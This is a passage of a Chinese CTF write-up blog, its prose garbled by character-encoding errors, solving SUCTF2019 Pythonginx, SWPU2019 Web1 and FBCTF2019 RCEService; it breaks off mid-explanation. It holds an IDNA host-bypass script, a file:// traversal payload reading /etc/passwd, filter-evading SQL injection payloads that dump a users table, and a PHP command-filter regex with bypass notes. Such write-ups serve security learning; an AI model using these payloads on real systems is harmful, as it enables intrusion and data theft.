<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> urllib import parse<br><span class="hljs-keyword">from</span> urllib.parse import urlsplit, urlparse, urlunsplit<br><br><span class="hljs-comment">#@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><br>    # url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>url = <span class="hljs-string">&quot;http://suctf.cX&quot;</span><br>host = parse.urlparse(url).hostname #è·å–åŸŸåipä¾‹ï¼šwww.xxxx.com<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host1= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span>)<br>parts = list(urlsplit(url))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;parts = &#x27;</span>,parts)<br>host = parts[1]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host2= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222&quot;</span>)<br>newhost = []<br><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>    newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>parts[1] = <span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br><span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span><br>finalUrl = urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[0]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;finalUrl = &#x27;</span> + finalUrl)<br>host = parse.urlparse(finalUrl).hostname<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;host3= &#x27;</span> +host)<br><span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 444&quot;</span>)<br><br><br><span class="hljs-comment">#host1= suctf.cx</span><br><span class="hljs-comment">#parts =  [&#x27;http&#x27;, &#x27;suctf.cX&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;]</span><br><span class="hljs-comment">#host2= suctf.cX</span><br><span class="hljs-comment">#finalUrl = http://suctf.cX</span><br><span class="hljs-comment">#host3= suctf.cx</span><br><span class="hljs-comment">#æˆ‘æ‰Œ your problem? 444</span><br></code></pre></td></tr></table></figure>


<p>ä»ä»£ç ä¸Šçœ‹ï¼Œæˆ‘ä»¬éœ€è¦æäº¤ä¸€ä¸ªurlï¼Œç”¨æ¥è¯»å–æœåŠ¡å™¨æ–‡ä»¶<br>éœ€è¦ç»•è¿‡å‰ä¸¤ä¸ªifï¼Œè¿›å…¥ç¬¬ä¸‰ä¸ªifæ¥ä½¿ç”¨å‡½æ•°<br>è€Œä¸‰ä¸ªifä¸­åˆ¤æ–­æ¡ä»¶éƒ½æ˜¯ç›¸åŒçš„ï¼Œä¸è¿‡åœ¨æ­¤ä¹‹å‰çš„hostæ„é€ å´æ˜¯ä¸åŒçš„ï¼Œè¿™ä¹Ÿæ˜¯blackhatè¯¥è®®é¢˜ä¸­æƒ³è¦è¯´æ˜çš„ä¸€ç‚¹<br>å½“URL ä¸­å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œè¾“å‡ºçš„ç»“æœå¯èƒ½ä¸åœ¨é¢„æœŸ<br>è¿™é‡Œéœ€è¦æŒ‰ç…§getUrlå‡½æ•°å†™å‡ºçˆ†ç ´è„šæœ¬å³å¯å¾—åˆ°æ„é€ è¯­å¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse,urlunsplit,urlsplit<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_unicode</span>():<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">65536</span>):<br>        uni=<span class="hljs-built_in">chr</span>(x)<br>        url=<span class="hljs-string">&quot;http://suctf.c&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(uni)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> getUrl(url):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;str: &quot;</span>+uni+<span class="hljs-string">&#x27; unicode: \\u&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(x))[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getUrl</span>(<span class="hljs-params">url</span>):<br>    url=url<br>    host=parse.urlparse(url).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    parts=<span class="hljs-built_in">list</span>(urlsplit(url))<br>    host=parts[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    newhost=[]<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.append(h.encode(<span class="hljs-string">&#x27;idna&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;.&#x27;</span>.join(newhost)<br>    finalUrl=urlunsplit(parts).split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host=parse.urlparse(finalUrl).hostname<br>    <span class="hljs-keyword">if</span> host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br> <br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_unicode()<br><br></code></pre></td></tr></table></figure>
<p><img src="/images/I1L8OCMS423Q6WG591.png" srcset="/img/loading.gif" lazyload></p>
<p>æˆ‘ä»¬åªéœ€è¦è®©å…¶ä¸­çš„ä¸€ä¸ªå»è¯»å–æ–‡ä»¶å³å¯ï¼Œéœ€è¦urlç¼–ç ä¸€ä¸‹<br>å…ˆè¯»ä¸€ä¸‹etc&#x2F;passwd<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/getUrl?url=file:/</span><span class="hljs-regexp">/suctf.c%E2%84%82/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure>
<p><img src="/images/AZEKDNX7SKH3FWH78.png" srcset="/img/loading.gif" lazyload><br>éƒ¨åˆ†nginxçš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">é…ç½®æ–‡ä»¶ï¼š <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š<span class="hljs-regexp">/etc/</span>nginx<br>ä¸»é…ç½®æ–‡ä»¶ï¼š<span class="hljs-regexp">/etc/</span>nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br>ç®¡ç†è„šæœ¬ï¼š<span class="hljs-regexp">/usr/</span>lib64<span class="hljs-regexp">/systemd/</span>system/nginx.service<br>æ¨¡å—ï¼š<span class="hljs-regexp">/usr/</span>lisb64<span class="hljs-regexp">/nginx/m</span>odules<br>åº”ç”¨ç¨‹åºï¼š<span class="hljs-regexp">/usr/</span>sbin/nginx<br>ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/nginx/</span>html<br>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š<span class="hljs-regexp">/var/</span>log/nginx<br></code></pre></td></tr></table></figure>
<p>æŒ¨ä¸ªè¯»è¯»è¯•è¯•<br>åœ¨é…ç½®æ–‡ä»¶ä¸­æˆ‘ä»¬å‘ç°<br><img src="/images/JEBYS4JSYT3P6T3.png" srcset="/img/loading.gif" lazyload><br>è¯»å–<br><img src="/images/RENLJ0UVWDRW3HCA4.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>ç™»å½•é¡µé¢ï¼Œæœ‰æ³¨å†Œå…ˆæ³¨å†Œ<br>è¿™é‡Œadminè¢«æ³¨å†Œäº†ï¼Œæ³¨å†Œä¸€ä¸ªadmin1ï¼Œç™»å½•<br><img src="/images/EIMTIHG6GCW38WPEIR.png" srcset="/img/loading.gif" lazyload><br>ç–‘ä¼¼æ³¨å…¥ç‚¹ï¼Œä¸‡èƒ½é’¥åŒ™æµ‹æµ‹<br><img src="/images/JVEITI0I8S3UWTV.png" srcset="/img/loading.gif" lazyload><br>å­˜åœ¨è¿‡æ»¤ï¼Œå†æµ‹æµ‹<br>ä¸€ç•ªæµ‹è¯•ä»¥åï¼Œå‘ç°è¿‡æ»¤äº†or,#,â€“+å’Œç©ºæ ¼</p>
<ul>
<li><p>ç©ºæ ¼è¢«è¿‡æ»¤<br>å¯ä»¥ç”¨&#x2F;**&#x2F;ä»£æ›¿ç©ºæ ¼</p>
</li>
<li><p>æ³¨é‡Šç¬¦è¢«è¿‡æ»¤<br>å°†åé¢çš„å•å¼•å·é—­åˆå³å¯</p>
</li>
<li><p>orè¢«è¿‡æ»¤<br>å¯¼è‡´ order by ã€information_schemaéƒ½ä¸èƒ½ç”¨ã€‚<br>äºæ˜¯æŸ¥è¡¨åå¯ä»¥ä½¿ç”¨select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database()</p>
</li>
</ul>
<p>å…ˆåˆ¤æ–­åˆ—æ•°<br>å› ä¸ºorè¢«ç¦ order byæ— æ³•ç”¨ï¼Œæ‰€ä»¥ç”¨group by ï¼Œä¸€æ ·çš„æ•ˆæœ<br>payload</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">by</span><span class="hljs-comment">/**/</span><span class="hljs-number">23</span>,<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/80730O6C28XTPBO8R9.png" srcset="/img/loading.gif" lazyload><br>åˆ¤æ–­ä¸º22åˆ—<br>å›æ˜¾ä½</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ä½ä¸º2ï¼Œ3</p>
<p>çˆ†æ•°æ®åº“</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/7P3H0XHID45SU1M592.png" srcset="/img/loading.gif" lazyload></p>
<p>çˆ†è¡¨</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;union/**/select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=<span class="hljs-string">&quot;web1&quot;</span>&#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/BOGXTMWDKOVT3N28.png" srcset="/img/loading.gif" lazyload></p>
<p>å› ä¸ºå…³é”®å­—è¢«ç¦ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥çˆ†å­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡è¿™ä¸€æ­¥éª¤ç›´æ¥é€šè¿‡è¡¨æ¥çˆ†å€¼<br>å­¦ä¹ åˆ°äº†ä¸€ä¸ªæ–°çš„æ¦‚å¿µï¼šä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼<br>æ— åˆ—åæ³¨å…¥</p>
<ol>
<li><p>å¦‚æœinformation_schemaè¢«WAF,å¾—åˆ°è¡¨åä¹‹åä½¿ç”¨æ— åˆ—åæ³¨å…¥æŠ€å·§è·å–å­—æ®µå€¼.<br><img src="/images/2016410-20200519163717474-1767458536.png" srcset="/img/loading.gif" lazyload></p>
</li>
<li><p>ä¹‹åå°±å¯ä»¥åˆ©ç”¨æ•°å­—æ¥å¯¹åº”ç›¸åº”çš„åˆ—,è¿›è¡ŒæŸ¥è¯¢<br><img src="/images/2016410-20200519164320071-1957869897.png" srcset="/img/loading.gif" lazyload></p>
</li>
</ol>
<p>â€ƒè¿™é‡Œæœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹:</p>
<p>1.åˆ—åéœ€è¦ç”¨&#96;&#96;åŒ…è£¹èµ·æ¥<br>2.ä½¿ç”¨å­æŸ¥è¯¢çš„æ—¶å€™,å³ä¸€ä¸ªæŸ¥è¯¢åµŒå¥—åœ¨å¦ä¸€ä¸ªæŸ¥è¯¢ä¸­,å†…å±‚æŸ¥è¯¢çš„ç»“æœå¯ä»¥ä½œä¸ºå¤–å±‚æŸ¥è¯¢çš„æ¡ä»¶,å†…å±‚æŸ¥è¯¢åˆ°çš„ç»“æœéœ€è¦èµ·ä¸€ä¸ªåˆ«å(as)</p>
<ol start="3">
<li>å¦‚æœåå¼•å·&#96;&#96;è¢«è¿‡æ»¤,å¯ä»¥ä½¿ç”¨ä¸ºå­—æ®µèµ·åˆ«åçš„æ–¹å¼.<br><img src="/images/2016410-20200519164947664-637568242.png" srcset="/img/loading.gif" lazyload><br>ç°åœ¨çš„æ€è·¯å°±æ˜æœ—äº†<br>payload<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;/**/union/**/select/**/<span class="hljs-number">1</span>,database(),(select/**/group_concat(`<span class="hljs-number">3</span>`)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>/**/as/**/a,<span class="hljs-number">3</span>/**/union/**/select/**/*/**/from/**/users)heihei),<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>&#x27;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>ä»£ç è§£æ</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">(`<span class="hljs-number">3</span>`)</span></span><br></code></pre></td></tr></table></figure>
<p>ä¸Šé¢è¡¨ç¤ºåˆ—ä¸º3</p>
<p>heiheiheiè¡¨ç¤ºæ´¾ç”Ÿè¡¨çš„åˆ«åï¼Œåå­—éšæ„<br><img src="/images/I1B1KP1JAETRBPE9A.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46230316/article/details/106668182">æ— åˆ—åæ³¨å…¥æ€»ç»“</a></p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>é¢˜ç›®è¯´è¦ä»¥ JSON æ ¼å¼è¾“å…¥å‘½ä»¤<br>è€ŒJSON éœ€è¦ç»™ä¸€ä¸ªé”®å€¼å¯¹<br>æ ¼å¼ä¸º</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;heiheihei&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>å…ˆè¾“å…¥</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/JOG2DW2SH1II1WFM.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ls /&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
<p>æ²¡æœ‰å›æ˜¾ï¼Œé”™è¯¯<br>å°è¯•ä½¿ç”¨{â€œcmdâ€:â€cat index.phpâ€} , è¿”å›: Hacking attempt detected ä¼°è®¡è¿‡æ»¤äº†cat ã€‚<br>dirsearchä»€ä¹ˆéƒ½æ²¡æ‰«å‡ºæ¥<br>çœ‹äº†çœ‹å¤§ä½¬çš„wpï¼Œè¿™é¢˜åº”è¯¥æ˜¯ä¼šç»™æºä»£ç çš„</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;?php<br><br>putenv(&#x27;PATH=/home/rceservice/jail&#x27;);<br><br><span class="hljs-keyword">if</span> (isset($_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>)) &#123;<br>  $json = $_REQUEST<span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br><br>  <span class="hljs-keyword">if</span> (!is<span class="hljs-constructor">_string($<span class="hljs-params">json</span>)</span>) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; elseif (preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span>^.<span class="hljs-operator">*</span>(<span class="hljs-params">alias</span>|<span class="hljs-params">bg</span>|<span class="hljs-params">bind</span>|<span class="hljs-params">break</span>|<span class="hljs-params">builtin</span>|<span class="hljs-params">case</span>|<span class="hljs-params">cd</span>|<span class="hljs-params">command</span>|<span class="hljs-params">compgen</span>|<span class="hljs-params">complete</span>|<span class="hljs-params">continue</span>|<span class="hljs-params">declare</span>|<span class="hljs-params">dirs</span>|<span class="hljs-params">disown</span>|<span class="hljs-params">echo</span>|<span class="hljs-params">enable</span>|<span class="hljs-params">eval</span>|<span class="hljs-params">exec</span>|<span class="hljs-params">exit</span>|<span class="hljs-params">export</span>|<span class="hljs-params">fc</span>|<span class="hljs-params">fg</span>|<span class="hljs-params">getopts</span>|<span class="hljs-params">hash</span>|<span class="hljs-params">help</span>|<span class="hljs-params">history</span>|<span class="hljs-params">if</span>|<span class="hljs-params">jobs</span>|<span class="hljs-params">kill</span>|<span class="hljs-params">let</span>|<span class="hljs-params">local</span>|<span class="hljs-params">logout</span>|<span class="hljs-params">popd</span>|<span class="hljs-params">printf</span>|<span class="hljs-params">pushd</span>|<span class="hljs-params">pwd</span>|<span class="hljs-params">read</span>|<span class="hljs-params">readonly</span>|<span class="hljs-params">return</span>|<span class="hljs-params">set</span>|<span class="hljs-params">shift</span>|<span class="hljs-params">shopt</span>|<span class="hljs-params">source</span>|<span class="hljs-params">suspend</span>|<span class="hljs-params">test</span>|<span class="hljs-params">times</span>|<span class="hljs-params">trap</span>|<span class="hljs-params">type</span>|<span class="hljs-params">typeset</span>|<span class="hljs-params">ulimit</span>|<span class="hljs-params">umask</span>|<span class="hljs-params">unalias</span>|<span class="hljs-params">unset</span>|<span class="hljs-params">until</span>|<span class="hljs-params">wait</span>|<span class="hljs-params">while</span>|[\<span class="hljs-params">x00</span>-\<span class="hljs-params">x1FA</span>-Z0-9!#-\<span class="hljs-operator">/</span>;-@\[-`|~\<span class="hljs-params">x7F</span>]+)</span>.*$/&#x27;, $json)) &#123;<br>    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    echo &#x27;Attempting <span class="hljs-keyword">to</span> run command:&lt;br/&gt;&#x27;;<br>    $cmd = json<span class="hljs-constructor">_decode($<span class="hljs-params">json</span>, <span class="hljs-params">true</span>)</span><span class="hljs-literal">[&#x27;<span class="hljs-identifier">cmd</span>&#x27;]</span>;<br>    <span class="hljs-keyword">if</span> ($cmd !== NULL) &#123;<br>      system($cmd);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      echo &#x27;Invalid input&#x27;;<br>    &#125;<br>    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;<br>  &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>

<p>ä»£ç ä¸­ä½¿ç”¨putenv(â€˜PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jailâ€™); é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œè€Œæˆ‘ä»¬ç”¨ä¸äº† cat ä¹Ÿæœ‰å¯èƒ½æ˜¯åœ¨è¿™ä¸ªç¯å¢ƒå˜é‡ä¸‹æ²¡æœ‰è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</p>
<p>å› ä¸ºè¿™äº›å‘½ä»¤å®é™…ä¸Šæ˜¯å­˜æ”¾åœ¨ç‰¹å®šç›®å½•ä¸­å°è£…å¥½çš„ç¨‹åºï¼ŒPATHç¯å¢ƒå˜é‡å°±æ˜¯å­˜æ”¾è¿™äº›ç‰¹å®šç›®å½•çš„è·¯å¾„æ–¹ä¾¿æˆ‘ä»¬å»ç›´æ¥è°ƒç”¨è¿™äº›å‘½ä»¤ï¼Œæ‰€ä»¥æ­¤å¤„éƒ¨åˆ†å‘½ä»¤æˆ‘ä»¬å¾—ä½¿ç”¨å…¶å­˜æ”¾çš„ç»å¯¹è·¯å¾„å»è°ƒç”¨</p>
<p>ç„¶åå°±æ˜¯æ­£åˆ™åŒ¹é…çš„ç»•è¿‡äº†<br>å¯ä»¥æ³¨æ„åˆ°æ­£åˆ™è¡¨è¾¾å¼é‡‡ç”¨äº†^xxx$çš„æ ¼å¼ï¼ŒåŒæ—¶ä¹Ÿé‡‡ç”¨äº†.*è¿™æ ·çš„è´ªå©ªåŒ¹é…ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªæ–¹æ¡ˆæ¥ç»•è¿‡æ­£åˆ™â€”â€”å›æº¯æ¬¡æ•°è¶…é™å’Œåˆ©ç”¨%0aã€‚</p>
<p>åˆ©ç”¨%0aï¼š%0aå¯¹äº^xxx$è¿™ä¸ªæ ¼å¼çš„ç»•è¿‡å¤ªå¸¸è§äº†ï¼Œåªéœ€è¦æ³¨æ„ä¸‹è¡¨è¾¾å¼ä¸­å­˜åœ¨ä¸€æ®µ</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>-\<span class="hljs-keyword">x</span><span class="hljs-number">1</span>F<br></code></pre></td></tr></table></figure>
